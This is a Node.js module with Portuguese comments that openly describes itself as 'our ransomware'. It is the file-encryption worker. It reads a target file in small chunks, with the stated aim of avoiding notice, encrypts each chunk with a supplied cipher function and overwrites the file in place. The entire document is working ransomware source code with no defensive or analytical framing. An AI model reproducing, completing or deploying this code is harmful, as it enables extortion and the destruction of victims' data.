const fs = require("fs");

/**
 * Nosso ransomware vai ler os arquivos por pequenas partes para não chamar atenção
 * e por isto, irá armazenar os bytes lidos em um Buffer do tamanho do chunkSize
 * depois disso vai encriptar o Buffer e por fim, irá salvar ele no mesmo local
 * onde estava antes (position), dentro do arquivo.
 * @param { string } file caminho do arquivo a ser encriptado
 * @param { function } cipher - a função responsável por cifrar ou decifrar o arquivo
 */
module.exports = syncWorker = (file, cipher) => {
  var chunkSize = 512, // quantidade de bytes que serão lidos, por vez
    position = 0, // posição dentro do arquivo, para ler os bytes a partir dela
    bytesRead = 0, // quantidade de dados lidos em cada loop de leitura (usada no loop)
    buffer = Buffer.alloc(chunkSize); // tamanho do buffer de leitura

  // abrindo o arquivo
  const fd = fs.openSync(file, "rs+");
  // le a quantidade bytes especificada em `chunkSize` a partir do ponto armazenado em `position`
  bytesRead = fs.readSync(fd, buffer, 0, chunkSize, position);
  // a partir deste momento o valor de buffer `buffer` foi alterado do valor inicial, para o valor contido dentro do arquivo
  // o valor contido do arquivo armazenado em buffer, corresponde a inicio: position - fim: chunkSize
  while (bytesRead > 0) {
    // encripta o conteúdo lido do arquivo
    var encrypted = cipher(buffer);

    const wc = fs.writeSync(fd, encrypted, 0, encrypted.length, position);
    // incrementa a posição de leitura e escrita do próximo loop
    position += wc;
    // atualiza o valor dos bytes lidos
    bytesRead = fs.readSync(fd, buffer, 0, chunkSize, position);
  }
  fs.closeSync(fd);
};
